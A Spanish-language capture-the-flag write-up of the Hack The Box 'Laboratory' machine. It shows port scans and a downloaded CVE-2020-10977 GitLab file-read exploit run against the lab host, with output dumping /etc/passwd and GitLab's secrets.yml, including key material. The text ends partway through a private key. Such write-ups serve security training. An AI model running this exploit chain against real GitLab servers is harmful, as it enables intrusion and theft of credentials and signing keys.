@@ -1,0 +1,987 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Laboratory - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Laboratory en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Laboratory">
+<meta property="og:url" content="http://localhost:4000/htb-laboratory/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Laboratory en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-laboratory/laboratory.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-03-21T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-laboratory/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Artículos</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categorías</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Etiquetas</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/buscador/">Buscador</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">Contacto</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Laboratory</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Intelligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Laboratory">
+    <meta itemprop="description" content="Resolución de la máquina Laboratory en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="March 21, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Laboratory
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-03-21T00:00:00-06:00">March 21, 2022 </time> 
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-laboratory/banner-laboratory.jpg" alt=""></p>
+
+<h2 id="laboratory">Laboratory</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.216.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.216
+PING 10.10.10.216 <span class="o">(</span>10.10.10.216<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.216: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>135 ms
+
+<span class="nt">---</span> 10.10.10.216 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 134.779/134.779/134.779/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.216 <span class="nt">-oG</span> allPorts
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-21 11:28 CST
+Initiating SYN Stealth Scan at 11:28
+Scanning 10.10.10.216 <span class="o">[</span>65535 ports]
+Discovered open port 80/tcp on 10.10.10.216
+Discovered open port 443/tcp on 10.10.10.216
+Discovered open port 22/tcp on 10.10.10.216
+Completed SYN Stealth Scan at 11:28, 27.44s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.216
+Host is up, received user-set <span class="o">(</span>0.22s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2022-03-21 11:28:08 CST <span class="k">for </span>27s
+Not shown: 65532 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT    STATE SERVICE REASON
+22/tcp  open  ssh     syn-ack ttl 63
+80/tcp  open  http    syn-ack ttl 63
+443/tcp open  https   syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>27.53 seconds
+           Raw packets sent: 131085 <span class="o">(</span>5.768MB<span class="o">)</span> | Rcvd: 20 <span class="o">(</span>880B<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬─────────────────────────────────────
+       │ File: extractPorts.tmp
+       │ Size: 121 B
+───────┼─────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.216
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 22,80,443
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80,443 10.10.10.216 <span class="nt">-oN</span> targeted
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-03-21 11:29 CST
+Nmap scan report <span class="k">for </span>10.10.10.216
+Host is up <span class="o">(</span>0.33s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d <span class="o">(</span>RSA<span class="o">)</span>
+|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp  open  http     Apache httpd 2.4.41
+|_http-title: Did not follow redirect to https://laboratory.htb/
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+443/tcp open  ssl/http Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-title: The Laboratory
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>laboratory.htb
+| Subject Alternative Name: DNS:git.laboratory.htb
+| Not valid before: 2020-07-05T10:39:28
+|_Not valid after:  2024-03-03T10:39:28
+| tls-alpn: 
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Service Info: Host: laboratory.htb<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>25.89 seconds
+</code></pre></div></div>
+
+<p>Aquí ya vemos cosas interesantes, los dominios <code class="language-plaintext highlighter-rouge">laboratory.htb</code> y <code class="language-plaintext highlighter-rouge">git.laboratory.htb</code>; incluso lo podemos corroborar al hacer un <code class="language-plaintext highlighter-rouge">whatweb</code> a la dirección IP:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.216/
+http://10.10.10.216/ <span class="o">[</span>302 Found] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.216], RedirectLocation[https://laboratory.htb/], Title[302 Found]
+ERROR Opening: https://laboratory.htb/ - no address <span class="k">for </span>laboratory.htb
+</code></pre></div></div>
+
+<p>Vemos que al hacer un <code class="language-plaintext highlighter-rouge">whatweb</code> a la dirección IP por el puerto 80, este nos redirige hacia <code class="language-plaintext highlighter-rouge">laboratory.htb</code> por el puerto 443. Por lo tanto, vamos a agregar los dominios a nuestro archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code> y antes de ver el contenido vía web, aplicaremos nuestro <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb https://laboratory.htb/
+https://laboratory.htb/ <span class="o">[</span>200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP[10.10.10.216], JQuery, Script, Title[The Laboratory]
+❯ whatweb https://git.laboratory.htb/
+https://git.laboratory.htb/ <span class="o">[</span>502 Bad Gateway] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[10.10.10.216], Script, Title[GitLab is not responding <span class="o">(</span>502<span class="o">)]</span>, nginx
+</code></pre></div></div>
+
+<p>Algo que ya vemos es que nos enfrentamos a un <a href="https://about.gitlab.com/">GitLab</a>:</p>
+
+<p><img src="/assets/images/htb-laboratory/laboratory-web.png" alt=""></p>
+
+<p>No contamos con credenciales de acceso; sin embargo, podemos registrarnos, así que eso haremos.</p>
+
+<p><img src="/assets/images/htb-laboratory/laboratory-web1.png" alt=""></p>
+
+<p>Es importante que el correo que demos debe ser <strong>loquesea@laboratory.htb</strong>. Una vez ingresando, vamos a ver que versión de gitlab es:</p>
+
+<p><img src="/assets/images/htb-laboratory/laboratory-web2.png" alt=""></p>
+
+<p>Nos enfrentamos antes <strong><em>GitLab Community Edition (CE) 12.8.1</em></strong>; por lo tanto, vamos a buscar posibles exploits que nos ayuden a vulnerar la máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit gitlab 12
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                 |  Path
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+GitLab 12.9.0 - Arbitrary File Read                                                            | ruby/webapps/48431.txt
+Gitlab 12.9.0 - Arbitrary File Read <span class="o">(</span>Authenticated<span class="o">)</span>                                            | ruby/webapps/49076.py
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+Papers: No Results
+</code></pre></div></div>
+
+<p>Vemos que no está nuestra versión; sin embargo, es posible que pueda aplicar, por lo tanto vamos a buscar algún exploit que nos ayude a leer archivos del sistema y encontramos <a href="https://github.com/thewhiteh4t/cve-2020-10977">cve-2020-10977</a>. Por lo tanto, vamos a descargarlo y probarlo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget https://raw.githubusercontent.com/thewhiteh4t/cve-2020-10977/main/cve_2020_10977.py
+<span class="nt">--2022-03-21</span> 13:06:57--  https://raw.githubusercontent.com/thewhiteh4t/cve-2020-10977/main/cve_2020_10977.py
+Resolviendo raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 185.199.109.133, 185.199.111.133, 185.199.110.133, ...
+Conectando con raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)[</span>185.199.109.133]:443... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 8422 <span class="o">(</span>8.2K<span class="o">)</span> <span class="o">[</span>text/plain]
+Grabando a: «cve_2020_10977.py»
+
+cve_2020_10977.py                100%[<span class="o">=======================================================&gt;]</span>   8.22K  <span class="nt">--</span>.-KB/s    en 0s      
+
+2022-03-21 13:06:57 <span class="o">(</span>97.2 MB/s<span class="o">)</span> - «cve_2020_10977.py» guardado <span class="o">[</span>8422/8422]
+</code></pre></div></div>
+
+<p>De acuerdo con al autor, nos dice como debemos ejecutarlo; por lo tanto, le pasamos los parámetros que nos indica y probaremos leer el <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ python3 cve_2020_10977.py https://git.laboratory.htb k4miyo k4miyo123
+<span class="nt">----------------------------------</span>
+<span class="nt">---</span> CVE-2020-10977 <span class="nt">---------------</span>
+<span class="nt">---</span> GitLab Arbitrary File Read <span class="nt">---</span>
+<span class="nt">---</span> 12.9.0 &amp; Below <span class="nt">---------------</span>
+<span class="nt">----------------------------------</span>
+
+<span class="o">[&gt;]</span> Found By : vakzz       <span class="o">[</span> https://hackerone.com/reports/827052 <span class="o">]</span>
+<span class="o">[&gt;]</span> PoC By   : thewhiteh4t <span class="o">[</span> https://twitter.com/thewhiteh4t      <span class="o">]</span>
+
+<span class="o">[</span>+] Target        : https://git.laboratory.htb
+<span class="o">[</span>+] Username      : k4miyo
+<span class="o">[</span>+] Password      : k4miyo123
+<span class="o">[</span>+] Project Names : ProjectOne, ProjectTwo
+
+<span class="o">[!]</span> Trying to Login...
+<span class="o">[</span>+] Login Successful!
+<span class="o">[!]</span> Creating ProjectOne...
+<span class="o">[</span>+] ProjectOne Created Successfully!
+<span class="o">[!]</span> Creating ProjectTwo...
+<span class="o">[</span>+] ProjectTwo Created Successfully!
+<span class="o">[&gt;]</span> Absolute Path to File : /etc/passwd
+<span class="o">[!]</span> Creating an Issue...
+<span class="o">[</span>+] Issue Created Successfully!
+<span class="o">[!]</span> Moving Issue...
+<span class="o">[</span>+] Issue Moved Successfully!
+<span class="o">[</span>+] File URL : https://git.laboratory.htb/k4miyo/ProjectTwo/uploads/2b6405acf51ef61d0dda1451135d4c3a/passwd
+
+<span class="o">&gt;</span> /etc/passwd
+<span class="nt">----------------------------------------</span>
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+<span class="nb">sync</span>:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System <span class="o">(</span>admin<span class="o">)</span>:/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+_apt:x:104:65534::/nonexistent:/bin/false
+sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+git:x:998:998::/var/opt/gitlab:/bin/sh
+gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
+gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
+gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
+mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
+registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
+gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
+gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
+
+<span class="nt">----------------------------------------</span>
+
+<span class="o">[&gt;]</span> Absolute Path to File :
+</code></pre></div></div>
+
+<p>Vemos el <code class="language-plaintext highlighter-rouge">/etc/passwd</code> de la máquina víctima. Ahora debemos pensar o buscar algún recurso de interés que no ayude a ingresar a la máquina; podríamos tratar de ver <code class="language-plaintext highlighter-rouge">id_rsa</code>; sin embargo, no está.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[&gt;]</span> Absolute Path to File : /home/git/.ssh/id_rsa  
+<span class="o">[!]</span> Creating an Issue...
+<span class="o">[</span>+] Issue Created Successfully!
+<span class="o">[!]</span> Moving Issue...
+<span class="o">[</span>+] Issue Moved Successfully!
+<span class="o">[</span>+] File URL : https://git.laboratory.htb/k4miyo/ProjectTwo/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../home/git/.ssh/id_rsa
+<span class="o">[</span>-] No such file or directory
+<span class="o">[&gt;]</span> Absolute Path to File :
+</code></pre></div></div>
+
+<p>Algo curioso del resultado, es que aplica un <strong>Directory Traversal</strong>. Si vamos al final del repositorio, vemos unas ligas y la que nos interesa es <a href="https://hackerone.com/reports/827052">hackerone</a>, ya que encontramos que podemos obtener ejecución de comandos a nivel de sistema. Primero debemos obtener el valor de <code class="language-plaintext highlighter-rouge">secret_key_base</code> que se encuentra bajo la ruta <code class="language-plaintext highlighter-rouge">/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] File URL : https://git.laboratory.htb/k4miyo/ProjectTwo/uploads/1affb44c93c09dc8fca22f1549d57a10/secrets.yml                 
+                                                                                                                                 
+<span class="o">&gt;</span> /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml                                                                   
+<span class="nt">----------------------------------------</span>                                                                                         
+                                                                                                                                 
+<span class="c"># This file is managed by gitlab-ctl. Manual changes will be                                                                     </span>
+<span class="c"># erased! To change the contents below, edit /etc/gitlab/gitlab.rb  </span>
+<span class="c"># and run `sudo gitlab-ctl reconfigure`.                                                                                         </span>
+                                                                                                                                 
+<span class="nt">---</span>                                                                                                                              
+production:                                                                                                                      
+  db_key_base: 627773a77f567a5853a5c6652018f3f6e41d04aa53ed1e0df33c66b04ef0c38b88f402e0e73ba7676e93f1e54e425f74d59528fb35b170a1b9
+d5ce620bc11838                                                                                                                   
+  secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b6500
+3510e4031e164137b3                                                                                                               
+  otp_key_base: db3432d6fa4c43e68bf7024f3c92fea4eeea1f6be1e6ebd6bb6e40e930f0933068810311dc9f0ec78196faa69e0aac01171d62f4e225d61e0
+b84263903fd06af                                                                                                                  
+  openid_connect_signing_key: |                                                                                                  
+    <span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----                                                                                              
+    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
